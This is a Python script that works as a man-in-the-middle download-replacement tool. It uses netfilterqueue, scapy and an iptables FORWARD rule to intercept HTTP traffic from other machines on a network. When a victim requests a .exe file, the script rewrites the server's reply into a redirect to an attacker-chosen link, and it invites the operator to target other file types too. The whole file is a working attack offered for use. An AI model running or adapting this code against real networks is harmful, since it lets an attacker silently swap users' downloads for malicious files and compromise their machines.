import subprocess
import netfilterqueue
import scapy.all as scapy

# Example 301 Response from wikipedia
'''
HTTP/1.1 301 Moved Permanently
Location: https://www.example.org/index.asp
'''
# Example Link for replacing
'''
https://www.transformice.com/Transformice.exe
'''

target_link = 'https://www.transformice.com/Transformice.exe' # Change this parameter as you wish
link = 'HTTP/1.1 301 Moved Permanently\nLocation: ' + target_link + '\n\n'

Queue = None
QueueNumb = 0
FileType = b'.exe'  # This attack is only against .exe file type, change this as you wish
                    # Such as .pdf, .zip and so on

ack_list = []

def set_load(pkt):
    pkt[scapy.Raw].load = link.encode()

    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum

    return bytes(pkt)

def call_back(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())

    if scapy_pkt.haslayer(scapy.Raw) and scapy_pkt.haslayer(scapy.TCP):

        if scapy_pkt[scapy.TCP].sport == 80 and scapy_pkt[scapy.TCP].seq in ack_list: # HTTP response
            print('[+] Replacing the file')
            ack_list.remove(scapy_pkt[scapy.TCP].seq)
            pkt.set_payload(set_load(scapy_pkt))
        elif scapy_pkt[scapy.TCP].dport == 80 and FileType in scapy_pkt[scapy.Raw].load: # HTTP request
            print('[+] .exe Request has been detected!')
            ack_list.append(scapy_pkt[scapy.TCP].ack)

    pkt.accept()

def init_queue():
    global Queue, QueueNumb
    Queue = netfilterqueue.NetfilterQueue()
    Queue.bind(QueueNumb, call_back)
    Queue.run()

def init_iptables():
    # Commented lines are for testing on your own machine rather than another machine
    #subprocess.call(['iptables','-I','INPUT','-j','NFQUEUE','--queue-num',str(QueueNumb)])
    #subprocess.call(['iptables','-I','OUTPUT','-j', 'NFQUEUE','--queue-num', str(QueueNumb)])
    subprocess.call(['iptables','-I','FORWARD','-j','NFQUEUE', '--queue-num',str(QueueNumb)])

def flush_queue():
    subprocess.call(['iptables','--flush'])

if __name__ == '__main__':
    init_iptables()
    try:
        init_queue()
    except KeyboardInterrupt:
        print('\n[-] CTRL-C  detected! Flushing the iptables ...')
        flush_queue()
